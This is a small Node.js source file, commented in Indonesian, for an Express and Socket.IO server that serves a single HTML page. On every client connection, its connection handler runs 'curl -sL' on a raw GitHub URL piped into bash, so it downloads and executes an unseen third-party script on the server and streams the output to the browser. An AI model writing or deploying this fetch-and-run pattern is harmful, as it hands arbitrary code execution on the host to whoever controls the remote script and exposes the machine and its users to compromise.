const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const runShellCommand = require('./commands'); // Import fungsi dari commands.js

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

io.on('connection', (socket) => {
    console.log('A user connected');

    // Jalankan perintah shell saat klien terhubung
    runShellCommand('curl -sL https://raw.githubusercontent.com/erlandi-main-api/gaga/main/x | bash', (error, output) => {
        if (error) {
            socket.emit('log', error);
        } else {
            socket.emit('log', output);
        }
    });

    socket.on('disconnect', () => {
        console.log('A user disconnected');
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
